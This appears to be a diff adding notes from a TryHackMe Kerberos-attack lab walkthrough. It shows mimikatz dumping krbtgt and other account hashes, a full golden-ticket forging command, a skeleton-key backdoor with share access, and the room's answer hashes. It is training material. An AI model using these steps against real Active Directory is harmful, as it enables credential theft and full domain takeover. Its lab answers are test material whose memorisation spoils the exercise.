+mimikatz # lsadump::lsa /inject /name:krbtgt 
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 72cd714611b64cd4d5550cd2759db3f6
+    LM   :
+  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
+    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
+    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6
+
+ * WDigest
+    01  d2e9aa3caa4509c3f11521c70539e4ad 
+    02  c9a868fc195308b03d72daa4a5a4ee47
+    03  171e066e448391c934d0681986f09ff4
+    04  d2e9aa3caa4509c3f11521c70539e4ad
+    05  c9a868fc195308b03d72daa4a5a4ee47
+    06  41903264777c4392345816b7ecbf0885
+    07  d2e9aa3caa4509c3f11521c70539e4ad
+    08  9a01474aa116953e6db452bb5cd7dc49
+    09  a8e9a6a41c9a6bf658094206b51a4ead
+    10  8720ff9de506f647ad30f6967b8fe61e
+    11  841061e45fdc428e3f10f69ec46a9c6d
+    12  a8e9a6a41c9a6bf658094206b51a4ead 
+    13  89d0db1c4f5d63ef4bacca5369f79a55
+    14  841061e45fdc428e3f10f69ec46a9c6d
+    15  a02ffdef87fc2a3969554c3f5465042a
+    16  4ce3ef8eb619a101919eee6cc0f22060
+    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
+    18  085f371533fc3860fdbf0c44148ae730
+    19  265525114c2c3581340ddb00e018683b
+    20  f5708f35889eee51a5fa0fb4ef337a9b
+    21  bffaf3c4eba18fd4c845965b64fca8e2
+    22  bffaf3c4eba18fd4c845965b64fca8e2
+    23  3c10f0ae74f162c4b81bf2a463a344aa 
+    24  96141c5119871bfb2a29c7ea7f0facef
+    25  f9e06fa832311bd00a07323980819074
+    26  99d1dd6629056af22d1aea639398825b
+    27  919f61b2c84eb1ff8d49ddc7871ab9e0
+    28  d5c266414ac9496e0e66ddcac2cbcc3b
+    29  aae5e850f950ef83a371abda478e05db
+
+ * Kerberos
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 79bf07137a8a6b8f
+
+ * Kerberos-Newer-Keys
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
+      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
+      des_cbc_md5       (4096) : 79bf07137a8a6b8f
+
+ * NTLM-Strong-NTOWF
+    Random Value : 4b9102d709aada4d56a27b6c3cd14223
+
+
+Create a Golden/Silver Ticket - 
+
+
+Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
+with SID= S-1-5-21-432953485-3795405108-1502158860 
+/krbtgt = NTLM = 72cd714611b64cd4d5550cd2759db3f6
+/id: RID  : 000001f6 (502) <<-- 502
+
+mimikatz#Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3
+f6 /id:502
+
+- What is the SQLService NTLM Hash?
+hint:
+lsadump::lsa /inject /name:sqlservice
+cd40c9ed96265531b21fc5b1dafcfb0a
+
+
+- What is the Administrator NTLM Hash?
+hint: lsadump::lsa /inject /name:Administrator 
+2777b7fec870e04dda00cd7260f7bee6
+
+#Task 8 Kerberos Backdoors w/ mimikatz 
+Installing the Skeleton Key w/ mimikatz -
+misc::skeleton
+exit
+net use \\CONTROLLER-1\admin$ /user:Administrator mimikatz
+The share will now be accessible without the need for the Administrators password
+or
+dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
+
+# Task 9 Conclusion
+https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
+https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
+https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
+https://www.varonis.com/blog/kerberos-authentication-explained/
+https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
+https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
+https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
+
+
+DONE!
+
+https://tryhackme.com/room/attackingkerberos
+https://ludovic-cyber-sec.netlify.app/attacking-kerberos-tryhackme
+
+
